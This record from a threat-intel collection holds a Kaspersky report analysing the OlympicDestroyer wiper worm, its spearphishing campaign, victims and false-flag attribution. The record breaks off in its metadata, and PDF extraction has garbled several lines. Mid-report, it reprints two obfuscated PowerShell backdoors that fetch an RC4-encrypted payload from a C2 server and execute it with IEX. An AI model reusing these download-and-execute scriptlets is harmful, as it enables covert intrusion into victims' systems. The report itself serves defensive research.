{
    "id": "ef4d5a40-3b39-403e-a13a-a6c1ddcec24f",
    "created_at": "2023-01-12T15:08:10.366997Z",
    "updated_at": "2025-03-27T02:17:11.38272Z",
    "deleted_at": null,
    "sha1_hash": "2d93f2a54832388c391c70c22a7a1a9a6d3aa92d",
    "title": "2018-03-08 - OlympicDestroyer is here to trick the industry",
    "authors": "",
    "file_creation_date": "2022-05-28T02:02:56Z",
    "file_modification_date": "2022-05-28T02:02:56Z",
    "file_size": 1096894,
    "plain_text": "# OlympicDestroyer is here to trick the industry\n\n**securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/**\n\nAuthors\n\nGReAT\n\nA couple of days after the opening ceremony of the Winter Olympics in Pyeongchang, South Korea, we received information from several\n[partners, on the condition of non-disclosure (TLP:Red), about a devastating malware attack on the Olympic infrastructure. A quick peek inside](https://encyclopedia.kaspersky.com/glossary/malware/?utm_source=securelist&utm_medium=blog&utm_campaign=termin-explanation)\nthe malware revealed a destructive self-modifying password-stealing self-propagating malicious program, which by any definition sounds pretty\nbad.\n\nAccording to [media reports, the organizers of the Pyeongchang Olympics confirmed they were investigating a cyberattack that temporarily](https://www.wired.com/story/olympic-destroyer-malware-pyeongchang-opening-ceremony/)\nparalyzed IT systems ahead of official opening ceremonies, shutting down display monitors, killing Wi-Fi, and taking down the Olympics\nwebsite so that visitors were unable to print tickets. We also found other attempts to wreak havoc at companies working closely with the Winter\nOlympics.\n\n## Malware features\n\nSeveral files related to the cyberattack were uploaded to VirusTotal on the day of the attack and were quickly picked up by other security\nresearchers. As we were researching this attack, the Cisco Talos team [published a brief description of the malware which Talos got from an](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)\n[undisclosed source. In their blog Talos highlighted some similarities between the attack, Netya (Expetr/NotPetya) and](https://securelist.com/expetrpetyanotpetya-is-a-wiper-not-ransomware/78902/) [BadRabbit (targeted](https://securelist.com/bad-rabbit-ransomware/82851/)\nransomware).\n\nThe Talos publication effectively removed the TLP constraint as the information had now become public and could be referenced in this way.\nHowever, we decided not to jump to conclusions, especially with regards to attribution, and spent time researching it calmly and\nmethodologically, while we continued to discover more and more false flags and controversies in the malware.\n\nThe main malware module is a network worm that consists of multiple components, including a legitimate PsExec tool from SysInternals’ suite,\na few credential stealer modules and a wiper. From a technical perspective, the purpose of the malware is to deliver and start the wiper\npayload which attempts to destroy files on the remote network shares over the next 60 minutes. Meanwhile, the main module collects user\n\n\n-----\n\npass o ds o b o se a d do s sto age a d c a ts a e ge e at o o t e o t at co ta s o d a d es y co ected co p o sed\ncredentials. The new generation of the worm is pushed to accessible local network computers and starts using the PsExec tool, leveraging the\ncollected credentials and current user privileges.\n\nOnce the wiper has run for 60 minutes it cleans Windows event logs, resets backups, deletes shadow copies from the file system, disables the\nrecovery item in the Windows boot menu, disables all the services on the system and reboots the computer. Those files on the network shares\nthat it managed to wipe within 60 minutes remain destroyed. The malware doesn’t use any persistence and even contains protection (also a\nkillswitch) against recurring reinfection. Incidentally, only 1MB of the remote files are fully overwritten with zeroes; larger files were wiped with\njust 1K of zeroes in the header. The local files are not destroyed and the worm doesn’t wipe itself or its components.\n\n_Fig.1 OlympicDestroyer component relations_\n\n## Reconnaissance stage\n\nSeveral companies have blogged about OlympicDestroyer’s attribution, it’s features and propagation method, but no one has discovered how\nexactly it was launched and from where. That’s where we had a little bit more luck.\n\nSince December 2017 security researchers have been seeing samples of MS Office documents in spearphishing emails related to the Winter\nOlympics uploaded to VirusTotal. The documents contained nothing but slightly formatted gibberish to make it look like the text had an\nencoding problem, encouraging the user to press a button to “Enable Content”.\n\n_Fig.2 Screenshot of attachment from a spearphishing email._\n\nWhen the victim “enables content”, the document starts a cmd.exe with a command line to execute a PowerShell scriptlet that, in turn,\ndownloads and executes a second stage PowerShell scriptlet and, eventually, backdoors the system. The only apparent links between this\nemail campaign and OlympicDestroyer would have been the target, however, we managed to discover a couple of connections between this\nweaponized document and the attack in Pyeongchang which makes us believe they are related.\n\n\n-----\n\no t s est gat o, ou a a ysts e e p o ded t ad st at e access to o e o t e a ected se e s ocated a ote based\nPyeongchang county, South Korea. A triage analysis was conducted on this Windows server system. The affected company also kindly\nprovided us with the network connections log from their network gateway. Thanks to this, we confirmed the presence of malicious traffic to a\nmalicious command and control server at IP 131.255.*.* which is located in Argentina. The infected host established multiple connections to\nthis server on ports from the following list:\n\n443\n4443\n8080\n8081\n8443\n8880\n\nThe server in Argentina was purchased from a reseller company in Bulgaria, which kindly assisted us in this investigation. The company\nshared that the server was purchased from Norway, by a person using a Protomail account:\n\nName: Simon ***\n\nEmail: simon***@protonmail.com\n\nLast Login Date: 2018-02-07 16:09\n\nIP Address: 82.102.*.* (Norway)\n\nServer purchased on: 2017-10-10\n\nWe were able to further connect this to a suspicious looking domain, with a registration address and phone number from Sweden:\n\nDomain: microsoft******[.]com\n\nRegistration name: Elvis ****\n\nEmail: elvis***@mail.com\n\nRegistration date: 2017-11-28\n\nBefore getting suspended in December 2017 for failing the ICANN email verification check, the domain registration was privacy-protected. This\nshielded the registration data, except the DNS servers, which indicate it was purchased via MonoVM, a VPS for a bitcoin provider:\n\nName Server: monovm.earth.orderbox-dns[.]com\nName Server: monovm.mars.orderbox-dns[.]com\nName Server: monovm.mercury.orderbox-dns[.]com\nName Server: monovm.venus.orderbox-dns[.]com\n\nName server history:\n\n_Fig.3 Name server history for microsoft*****.com_\n\n\n-----\n\ns e a popped up as a co tact deta o a s a et o s de t e 89 **9** a ge t at s ocated **a a** **sta** s s e e t e t a\nends for now. We apologize for not disclosing the full information as we would like to avoid random interactions with this contact. Full\ninformation has been provided to law enforcement agencies and customers subscribed to our APT Intel reporting service.\n\nTo manage the server in Argentina, Simon *** used the IP address in Norway (82.102.*.*). This is the gateway of a VPN service known as\n**NordVPN** [(https://nordvpn.com/) that offers privacy-protected VPN services for bitcoins.](https://nordvpn.com/)\n\nIt’s not the first time the name NordVPN has cropped up in this case. We previously saw a weaponized Word document used in spearphishing\nemails targeting the Winter Olympics that contained something that looked like garbage text taken from a binary object (e.g. pagefile or even\nraw disk). However, part of the random data included two clearly readable text strings (highlighted below) that made it into the document (md5:\n5ba7ec869c7157efc1e52f5157705867) for no obvious reason:\n\n_Fig. 4 A reference to NordVPN openvpn config file_\n\nOf course, this is a low confidence indicator, but seems to be another link between the spearphishing campaign on the Winter Olympics and\nthe attackers responsible for launching the OlympicDestroyer worm. In addition, this document includes a PowerShell command that closely\nresembles the PowerShell backdoor found in the network of the OlympicDestroyer victim. A comparison of this code is available below.\n\nThe PowerShell scripts listed below were used in the weaponized documents and as standalone backdoors. As standalone fileless backdoors,\nthey were built and obfuscated using the same tool. Both scripts use a similar URL structure and both implement RC4 in PowerShell, as well\nas using a secret key passed to the server in base64 via cookies.\n\nSpearphishing case in South Korea Powershell found on OlympicDestroyer victim\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n\n( gCi VariABLE:FzS3AV ).\"VaLUE\"::\"expecT100cOnTiNUe\"=0;\n\n${wC}=^&NEW-ObjecT System.Net.Webclient;${u}=Mozilla/5.0 (Windows NT\n6.1;WOW64; Trident/7.0; rv:11.0)like Gecko;\n\n( GCI VARiabLe:fZS3aV ).\"vAlUe\"::\"seRVeRCeRTiFICaTEVALIDATIoNCALlbAck\" =\n{${tRUE}};\n\n${wC}.\"hEADERs\".Add.Invoke(User-Agent,${U});\n\n${WC}.\"PROXy\"= ( variaBLe (\"fX32R\") -VAlUeO )::\"DefaultWebProxy\";\n\n${wc}.\"pRoxY\".\"CREdENtials\" = ( GET-vaRiABle\n('hE7KU')).\"VAlue\"::\"dEFauLTNeTWOrkCREdENTIALs\";\n\n${K}= $XNLO::\"asCiI\".GetBytes.Invoke(5e2988cfc41d844e2114dceb8851d0bb);\n\n${R}=\n\n{\n\n${D},${K}=${ArGs};\n\n${s}=0..255;0..255^|^&('%')\n\n{\n\n${j}=(${j}+${s}[${_}]+${k}[${_}%${K}.\"couNt\"])%256;\n\n${s}[${_}],${S}[${J}]=${s}[${J}],${S}[${_}]\n\n};\n\n${d}^|^&('%')\n\n{\n\n${I}=(${I}+1)%256;\n\n${h}=(${H}+${s}[${I}])%256;\n\n${S}[${I}],${s}[${H}]=${s}[${H}],${S}[${I}];\n\n${_}-BxoR${S}[(${s}[${I}]+${S}[${H}])%256]}\n\n};\n\n${Wc}.\"hEadeRS\".Add.Invoke(cookie,session=ABWjqj0NiqToVn0TW2FTlHIAApw=);\n\n${SER}=https://minibo***[.]cl:443;\n\n${T}=/components/com_tags/controllers/default_tags.php;\n\n${dATa}=${Wc}.DownloadData.Invoke(${seR}+${T});\n\n${IV}=${DATA}[0..3];\n\n${dAta}=${DaTA}[4..${dAtA}.length];\n\n-jOin[ChaR[]](^& ${R} ${DAtA} (${IV}+${K}))^|.IEX &&SeT  RMN=ecHo InvoKeexpRESsIon ([ENVirOnMeNt]::gETeNvIroNMENTvarIaBlE('svTI','procEsS')) ^|\npOWErshEll -NOnint -wiNdOWSt hiddeN -NoEXiT -NoprOFilE ExECuTiONPOLIcy bYpASs   - && CMd.exE  /c%Rmn%\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n\nIf($PSVERsIoNTAbLe.PSVeRsIon.MAJOR\n('cachedGroupPolicySettings','N'+'onPublic\n\nIf($GPS['ScriptB'+'lockLogging']){$GPS['Sc\n\n$GPS['ScriptB'+'lockLogging']['EnableScrip\nCoLLectIOnS.GeNeRIC.HAshSet[stRing]))}\n\n};\n\n[SYStem.NeT.SerVicePoinTMANAGeR]::EX\n\n$wC=NeW-ObJect SySTem.NEt.WEBClIeN\n\n$u='Mozilla/5.0 (Windows NT 6.1; WOW64\n\n$Wc.HEADErS.Add('User-Agent',$u);\n\n$wC.ProXY=[SYsTeM.NET.WeBREqUesT]\n\n$wC.PROxY.CredentIAlS = [SYsTem.NEt.C\n\n$Script:Proxy = $wc.Proxy;\n\n$K=[SysTEM.Text.ENcOding]::ASCII.GETB\n\n$R=\n\n{\n\n$D,$K=$ARgs;\n\n$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%\n\n$S[$_],$S[$J]=$S[$J],$S[$_]};\n\n$D|%\n\n{\n\n$I=($I+1)%256;\n\n$H=($H+$S[$I])%256;\n\n$S[$I],$S[$H]=$S[$H],$S[$I];\n\n$_-bxor$S[($S[$I]+$S[$H])%256]\n\n}\n\n};\n\n$ser='http://131.255.*.*:8081';\n\n$t='/admin/get.php';\n\n$wc.HeAders.Add(\"Cookie\",\"session=zt8VX\n\n$daTA=$WC.DownlOADDATA($ser+$t);\n\n$iV=$DATa[0..3];\n\n$datA=$dATa[4..$data.leNgth];\n\n-joiN[CHAR[]](& $R $dAta ($IV+$K))|IEX\n\n\n## Lateral movement\n\nDespite the network worm’s self-replicating feature, the attackers did some manual lateral movement before starting on the destructive\nmalware. We believe this was done to look for a better spot to release the worm. They seemed to be moving through the network via Psexec\nand stolen credentials, opening a default meterpreter port (TCP 4444) and downloading and running a backdoor (meterpreter). The attackers\nalso checked the network configuration, potentially searching for servers attached to multiple networks or VPN links in order to penetrate\nadjacent networks that could be linked to the Olympic Committee infrastructure.\n\n\n-----\n\nO e o t e osts t e et o o t e a ected s eso t ote ad aspe s y ab s syste atc e co po e t e ab ed, c co ected qu te\na few of the artifacts used by the attackers for lateral movement. According to the telemetry from this host, the attackers entered the system on\n6 February, 2018. They used three types of PowerShell scriptlets: TCP 4444 port opener, ipconfig launcher and a downloader.\n\nBased on telemetry we received from one of the hosts, we built a timeline of the attackers’ activity and a histogram showing when the attackers\nstarted executables on the system.\n\n_Fig.5 Histogram with attacker activity per hour of day_\n\nFrom this we can see that the attackers were mostly busy outside of office hours according to Korean Standard Time (UTC+9), perhaps to\nattract less attention or simply due to their own timezone.\n\n## Worm propagation\n\nOlympicDestroyer is a network worm that collects user credentials with hostnames. New data is appended to the end of an existing collection.\nHaving multiple samples of the worm from different networks allows us to reconstruct the path of the worm and find the source of distribution\n(or at least its hostname and list of users).\n\n\n-----\n\n_Fig.6 OlympicDestroyer worm propagation_\n\nThe diagram above was built based on extracted lists of credentials with hostnames and some alleged roles of the servers based on\nrespective names. We can see there were at least three independent launch pads for the worm: Atos.net company, ski resort hotels, and the\nPyeongchang2018.com server.\n\nAt some point, samples with a list of credentials were uploaded to VirusTotal where they were found by security researchers that executed the\nworm in a sandbox environment and uploaded the new generation on VirusTotal again. There are a number of samples on VT that contain\ncredentials from those sandbox machines. Nevertheless, it’s clear the network worm wasn’t started there initially, but was instead coming from\none of the known launch pads.\n\n## Victims\n\nSpearphishing emails were used to target the networks of official partners of the Winter Olympics. The attackers probably went to the official\nwebsite to find out the names of the partner companies, figured out their domain names, collected known email addresses and started\nbombarding them with spearphishes.\n\nOne of these weaponized documents was uploaded to VT from South Korea on 29 December, 2017 inside an email file\n(6b728d2966194968d12c56f8e3691855). The sender address imitates the South Korean NCTC (National Counter-Terrorism Center), while the\nsender’s server IP originates from a server in Singapore.\n\n\n-----\n\n_Fig.7 Fake sender address._\n\nThe email appears to have been sent to icehockey@pyeongchang2018[.]com. However, the real targets are in the following list:\n\n**Industry** **Target Company/Organization Domain**\n\nGovernment organization airport.co.kr\ncustoms.go.kr\nkepco.co.kr\nkma.go.kr\nkorail.com\nkorea.kr\npyeongchang2018.com\nsports.or.kr\n\nEnterprise sk.com\nkt.com\n\nEnergy esco-posco.co.kr\nposco.co.kr\n\nSemiconductor skhynix.com\nus.skhynix.com\n\nTransport koreanair.com\nhanjin.co.kr\n\nHospital gnah.co.kr\n\nMedia donga.com\n\nAdvertising ppcom.kr\nsamikdisplay.co.kr (LED display company)\ntkad.co.kr\nvestceo@naver.com (LED Panel Advertising company email)\n\nResort/Hotel alpensiaresort.co.kr\nyongpyong.co.kr\n\nThe attackers appear to have got sloppy when they searched for email addresses that ended with those targeted domains. Using short domain\nnames such as sk.com or kt.com wasn’t a good idea. This went unnoticed and a few totally unrelated companies with domain names ending\nwith sk.com and kt.com received spearphishing emails:\n\nkrovy-sk.com (Wood company in Slovakia)\nokc-sk.com (Mining-related company in Canada)\nbcel-kt.com (Finance company in Laos)\nkuhlekt.com (Software company in Australia)\nwertprojekt.com (Real estate company in Germany)\n\nBased on all the evidence we discovered, the following networks seem to have been breached in the attack:\n\nSoftware vendor responsible for automation at ski resorts\nTwo ski resort hotels in South Korea\nIT service provider (Atos.net) headquartered in France\ncom attached network\n\n\n-----\n\nCo s de g t e a a e as sp ead as a et o o a do s et o s a es, co ate a da age as e tab e oug o e o t e\nvictims who uploaded the dropper file to VT from Austria, we were able to extract the hostname from the stolen credentials stored in the\nmalware: ATVIES2BQA. While it may look like a random sequence of characters at first glance, we speculate that AT stands for the host\ncountry code (Austria) which matches the submitter source country, followed by the organization name “VIES” with some extra random\ncharacters uniquely identifying the host. According to OSINT, there is only one large organization that matches this name in Austria – the VAT\n**Information Exchange System used throughout the European Union. VIES is a search engine owned by the European Commission. So, it’s**\neither a compromised host of Atos which role is to communicate with the Austrian VIES or the Austrian VIES indeed is indeed in collateral\ndamage of the malware’s network propagation.\n\nBut the main outbreak of the worm that we investigated was at a hotel in a South Korean winter resort. The hotel didn´t upload any samples to\nVT, which is why it remained unknown. We assume many other companies attacked in South Korea did the same, which reduced the visible\nsurface of the attacked infrastructure.\n\nWhile we cannot name the hotel chain, we can say that one of its hotels located in a ski resort in Pyeongchang was subjected to an attack.\nDespite the close proximity to the Olympic Games, the resort was not one of the official winter parks staging the games. However, it is\ndefinitely part of the surrounding infrastructure that hosted numerous guests and possibly even sports teams competing at the Olympics. In an\ninterview with the owners, we found out that the malware disabled ski gates and ski lifts that were operated from one of the attacked servers.\nOur analysis showed that this was not collateral damage. The attackers deliberately chose to start the spread of the destructive worm from this\ndedicated ski resort automation server. That server was the so-called patient-zero in the network. The timing was also chosen to precede the\nofficial opening ceremony by a couple of hours, allowing the worm to propagate deep enough into networks to cause maximum inconvenience\nfor those using the affected infrastructure. As a matter of fact, the plan was to let the worm gain better visibility in the news.\n\n## Attribution hell\n\nIn their [blog the Cisco Talos researchers also pointed out that OlympicDestroyer used similar techniques to Badrabbit and NotPetya to reset](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)\nthe event log and delete backups. Although the intention and purpose of both implementations of the techniques are similar, there are many\ndifferences in the code semantics. It’s definitely not copy-pasted code and because the command lines were publicly discussed on security\nblogs, these simple techniques became available to anyone who wants to use them.\n\n_Fig.8 Event logs cleaning and disabling system recovery in OlympicDestroyer and NotPetya_\n\nSoon after the Talos publication, Israeli company IntezerLabs tweeted that they had found links to Chinese APT groups.\n\n\n-----\n\n_g_ _y_ _,_\n\n[IntezerLabs released a blogpost with an analysis of features found using their in-house malware similarity technology.](http://www.intezer.com/2018-winter-cyber-olympics-code-similarities-cyber-attacks-pyeongchang/)\n\n[A few days later media outlets started publishing articles suggesting potential motives and activities by Russian APT groups: “Crowdstrike](https://www.scmagazineuk.com/2018-winter-olympics-hit-with-destroyer-malware-during-opening-ceremony/article/743928/)\nIntelligence said that in November and December of 2017 it had observed a credential harvesting operation operating in the international\nsporting sector. At the time it attributed this operation to Russian hacking group Fancy Bear”…”.\n\n[On the other hand, Crowdstrike’s own VP of Intelligence, Adam Meyers, in an interview with the media said: “There is no evidence connecting](https://www.scmagazineuk.com/2018-winter-olympics-hit-with-destroyer-malware-during-opening-ceremony/article/743928/)\nFancy Bear to the Olympic attack”.\n\n[However, a couple of weeks later, the Russian trace was brought up again by the Washington Post, which claimed that Russian military spies](https://www.washingtonpost.com/world/national-security/russian-spies-hacked-the-olympics-and-tried-to-make-it-look-like-north-korea-did-it-us-officials-say/2018/02/24/44b5468e-18f2-11e8-92c9-376b4fe57ff7_story.html)\nwere behind the Winter Olympics attack, citing “two U.S. officials who spoke on the condition of anonymity”. Unfortunately, such articles based\non anonymous sources contain no verifiable information and bring no real answers – they only spread rumors.\n\nMicrosoft’s security team also seems to have been tricked by the malware as their internal detection was triggered on the potential use of\nEternalRomance exploit (MS17-010).\n\n_Fig.10 Microsoft security team claims they found EternalRomance in OlympicDestroyer_\n\nA couple of days later Microsoft had to retract those claims as they were simply not confirmed.\n\n_Fig.11 Microsoft security team retracts previous claims in a subsequent tweet_\n\nThe day after we released a private report with forensic findings and detailed analysis of this attribution hell to our APT Intel subscribers (for\n[more information please contact: intelreports@kaspersky.com), the Cisco Talos team decided to revisit OlympicDestroyer and go public with a](http://10.10.0.46/mailto:intelreports@kaspersky.com)\n[similar review. We сan’t help but agree with this nice write-up with code comparison, because we came to very similar conclusions.](https://blog.talosintelligence.com/2018/02/who-wasnt-responsible-for-olympic.html)\n\nIn addition, Talos researchers noted that the evtchk.txt filename, which the malware used as a potential false-flag during its operation, was very\nsimilar to the filenames (evtdiag.exe, evtsys.exe and evtchk.bat) used by BlueNoroff/Lazarus in the Bangladesh SWIFT cyberheist in 2016.\n\n\n-----\n\neco ded utu e dec ded to ot att bute t s attac to a y acto ; o e e, t ey c a ed t at t ey ou d s a t es to ue o o / a a us\nLimaCharlie malware loaders that are widely believed to be North Korean actors.\n\nWe can’t dispute that part of the code really does resemble the Lazarus code. The wiper modules used in OlympicDestroyer (MD5:\n3c0d740347b0362331c882c2dee96dbf) and Bluenoroff (MD5: 5d0ffbc8389f27b0649696f0ef5b3cfe) used similar code to wipe files.\n\n_Fig.12 Comparison of wiping module (left: Bluenoroff tool; right: OlympicDestroyer)_\n\nThere is also a high level of similarity between Lazarus and OlympicDestroyer. There are modules in both campaigns that used the same\ntechnique to decrypt a payload in memory using a secret password provided via a command line. Lazarus used this in their malware loaders\n(Recorded Future also mentions a similarity in malware loader code) to protect their backdoor modules from reverse engineering as they\ncontained some default C2 information.\n\nDespite the resemblance in the method, there are significant differences in its usage:\n\n1. Lazarus used long and reliable alphanumeric passwords (30+ characters long). OlympicDestroyer on the contrary used a very simple\n\npassword: “123”.\n2. Lazarus never hardcoded its passwords for protected payloads into the malware body. OlympicDestroyer on the contrary hardcoded it\n\n(there was actually no other way, because the worm had to spread itself and run fully autonomously). That’s why the whole idea of using\npassword-protected payloads in the network worm looks ridiculous, and we believe it’s unlikely an actor such as Lazarus would\nimplement techniques like that considering their previous TTPs.\n\nThe possibility of North Korean involvement looked way off mark, especially since Kim Jong-un’s own sister attended the opening ceremony in\nPyeongchang. According to our forensic findings, the attack was started immediately before the official opening ceremony on 9 February,\n2018.\n\nWhat we discovered next brought a big shock. Using our own in-house malware similarity system we have discovered a unique pattern that\nlinked Olympic Destroyer to Lazarus. A combination of certain code development environment features stored in executable files, known as\nRich header, may be used as a fingerprint identifying the malware authors and their projects in some cases. In case of Olympic Destroyer\nwiper sample analyzed by Kaspersky Lab this “fingerprint” gave a 100% match with previously known Lazarus malware components and zero\noverlap with any other clean or malicious file known to date to Kaspersky Lab.\n\nYet the motives and other inconsistencies with Lazarus TTPs made some of our researchers skeptically revisit that rare artefact. With another\ncareful look into these evidence and manual verification of each feature we discovered that the set of features doesn’t match the actual code.\nAt that moment it became clear that the set of features was simply forged to perfectly match the fingerprint used by Lazarus. Considering that\nthis is not very well explored area in malware analysis and attribution, we decided to share some more information on how we proved in a\n[dedicate blogpost with some deep technical details.](https://securelist.com/the-devils-in-the-rich-header/84348/)\n\nWe also noticed that there exists a wiper module with original Rich header and it was uploaded to VirusTotal from France where one of the\nvictims (Atos) is located. The compilation timestamp was 2018-02-09 10:42:19 which is almost 2 hours after attack in Pyeongchang ski resorts\nstarted. It’s unclear what went wrong but it looks like the attackers rushed to modify the worm’s wiper component, so that it immediately\ndisabled system services and rebooted the machine instead of waiting for 60 minutes. They seem to wanted immediate results as there were\njust minutes before the official opening ceremony started.\n\nConsidering all of the above it it now looks like a very sophisticated false flag which was placed inside the malware intentionally in order to give\nthreat hunter impression that they found a smoking gun evidence, knocking them of the trail to the accurate attribution.\n\n## Conclusions\n\n\n-----\n\nat co c us o s ca e d a o t s\n\nIt really depends on how clever the attacker behind this campaign is.\n\nIf Lazarus was the smartest of all, then they could have crafted a sophisticated false flag that would be hard to discover, requiring even more\nsophistication to prove it’s a forgery. However, the level of researcher sophistication is something that’s difficult for attackers to gauge. The\nlevel of complexity we’re talking about would definitely reduce reliability and couldn’t guarantee that everything went to plan. In addition,\nLazarus had no rational motive to conduct this attack, not to mention TTPs that obviously weren’t theirs.\n\nSpeaking of TTPs, we have seen attackers using NordVPN and MonoVM hosting. Both services are available for bitcoins, which make them\nthe perfect tool for APT actors. This and several other TTPs have in the past been used by the Sofacy APT group, a widely known Russian[language threat actor. A year ago we published our research about the Lazarus APT group using false flags in attacks against banks around](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf)\nthe world that pointed to a Russian origin. Was it payback from Russian-speaking Sofacy or was it someone else trying to frame Sofacy? The\nmuddied waters of this case mean we are yet to get a clear answer.\n\nThere are some open questions about the attacker’s motivation in this story. We know that the attackers had administrative accounts in the\naffected networks. By deleting backups and destroying all local data they could have easily devastated the Olympic infrastructure. Instead,\nthey decided to do some “light” destruction: wiping files on Windows shares, resetting event logs, deleting backups, disabling Windows\nservices and rebooting systems into an unbootable state. When you add in the multiple similarities to TTPs used by other actors and malware,\nintentional false flags and relatively good opsec, it merely raises more questions as to the purpose of all this.\n\nAs we see it, these are some of the possible motives behind the attack:\n\n1. Demonstration of power/skills in the context of a secret communication that we’re unaware of. The potential for full-blown, highly\n\ndestructive cybersabotage might be a strong argument in top-secret political negotiations.\n2. Testing of destructive worm capability, but with lower impact to avoid too much attention from potential investigators and general public\n\n(in case of human error or operational failure).\n3. Trap threat intel researchers in a field of false flags and, based on their responses, learn how to implement the perfect false flag.\n\nThe last option makes sense when you consider that the malware contained a wiper that wasn’t used to wipe its own components – the\nauthors wanted it to be discovered.\n\nFor a powerful attacker learning how to reliably craft false flags and trick researchers into attributing the attack to someone else can mean\ngaining the ultimate cover – total immunity against attribution. But this kind of rocket science requires real-life experiments.\n\nWe think the carefully orchestrated OlympicDestroyer campaign played a very important role that will shape APT research in the future. While\nit didn’t fully sabotage the Winter Olympic games in Pyeongchang, its effects were noticed not only in South Korea but also in Europe. Most\nimportantly, it brings with it a potential threat to the attribution process, undermining trust in intel research findings.\n\nThere’s a lesson to be taken from this attack that’s useful for all of us in threat intelligence – don’t rush with attribution. This is a very delicate\nsubject that should be handled with great care. We as an industry shouldn’t sacrifice the accuracy of our research to opportunistically promote\nbusiness.\n\n## Known OlympicDestroyer executables\n\n0311CEC923C57A435E735E106517797F\n\n104ECBC2746702FA6ECD4562A867E7FB\n\n12668F8D072E89CF04B9CBCD5A3492E1\n\n19C539FF2C50A0EFD52BB5B93D03665A\n\n221C6DB5B60049E3F1CDBB6212BE7F41\n\n3514205D697005884B3564197A6E4A34\n\n3C0D740347B0362331C882C2DEE96DBF\n\n47E67D1C9382D62370A0D71FECC5368B\n\n4C8FA3731EFD2C5097E903D50079A44D\n\n4F43F03783F9789F804DCF9B9474FA6D\n\n51545ABCF4F196095ED102B0D08DEA7E\n\n52775F24E230C96EA5697BCA79C72C8E\n\n567D379B87A54750914D2F0F6C3B6571\n\n5778D8FF5156DE1F63361BD530E0404D\n\n583F05B4F1724ED2EBFD06DD29064214\n\n58DD6099F8DF7E5509CEE3CB279D74D5\n\n59C3F3F99F44029DE81293B1E7C37ED2\n\n64AA21201BFD88D521FE90D44C7B5DBA\n\n65C024D60AF18FFAB051F97CCDDFAB7F\n\n68970B2CD5430C812BEF5B87C1ADD6EA\n\n6E0EBEEEA1CB00192B074B288A4F9CFE\n\n\n-----\n\nC3 9 05 803 C 8 C 08 C 5 96\n83D8D40F435521C097D3F6F4D2358C67\n86D1A184850859A6A4D1C35982F3C40E\n\n[APT](https://securelist.com/tag/apt/)\n[Backdoor](https://securelist.com/tag/backdoor/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[Olympic Destroyer](https://securelist.com/tag/olympic-destroyer/)\n[Spear phishing](https://securelist.com/tag/spear-phishing/)\n[Vulnerabilities and exploits](https://securelist.com/tag/vulnerabilities-and-exploits/)\n[Wiper](https://securelist.com/tag/wiper/)\n[Worm](https://securelist.com/tag/worm/)\n\nAuthors\n\nGReAT\n\nOlympicDestroyer is here to trick the industry\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-03-08 - OlympicDestroyer is here to trick the industry.pdf"
    ],
    "report_names": [
        "2018-03-08 - OlympicDestroyer is here to trick the industry.pdf"
    ],
    "threat_actors": [
        {
            "id": "1bdb91cf-f1a6-4bed-8cfa-c7ea1b635ebd",
            "created_at": "2022-10-25T16:07:23.766784Z",
            "updated_at": "2025-03-27T02:02:09.971636Z",
            "deleted_at": null,
            "main_name": "Bluenoroff",
            "aliases": [
                "APT 38",
                "ATK 117",
                "Alluring Pisces",
                "Black Alicanto",
                "Bluenoroff",
                "CTG-6459",
                "Copernicium",
                "Nickel Gladstone",
                "Sapphire Sleet",
                "Selective Pisces",
                "Stardust Chollima",
                "T-APT-15",
                "TA444",
                "TAG-71",
                "TEMP.Hermit"
            ],
            "source_name": "ETDA:Bluenoroff",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f426f0a0-faef-4c0e-bcf8-88974116c9d0",
            "created_at": "2022-10-25T15:50:23.240383Z",
            "updated_at": "2025-03-27T02:00:55.404232Z",
            "deleted_at": null,
            "main_name": "APT38",
            "aliases": [
                "APT38",
                "NICKEL GLADSTONE",
                "BeagleBoyz",
                "Bluenoroff",
                "Stardust Chollima",
                "Sapphire Sleet",
                "COPERNICIUM"
            ],
            "source_name": "MITRE:APT38",
            "tools": [
                "ECCENTRICBANDWAGON",
                "HOPLIGHT",
                "Mimikatz",
                "KillDisk",
                "DarkComet"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
